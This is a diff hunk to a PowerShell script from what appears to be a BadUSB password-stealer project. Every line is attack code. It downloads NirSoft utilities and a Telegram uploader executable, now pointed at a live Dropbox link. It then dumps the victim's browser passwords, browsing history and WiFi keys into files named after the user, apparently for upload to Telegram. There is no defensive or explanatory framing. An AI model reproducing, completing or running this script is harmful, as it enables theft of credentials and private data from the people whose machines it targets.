@@ -12,7 +12,7 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
-Invoke-WebRequest LINK -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
+Invoke-WebRequest https://www.dropbox.com/scl/fi/b2blrjua24j3uwk6nppvk/telegram_uploader.exe?rlkey=dc2d1mfvhcw4o69vk9wnroq7s&st=8oji2ss0&dl=1 -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
 .\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt #Create the file for WiFi passwords
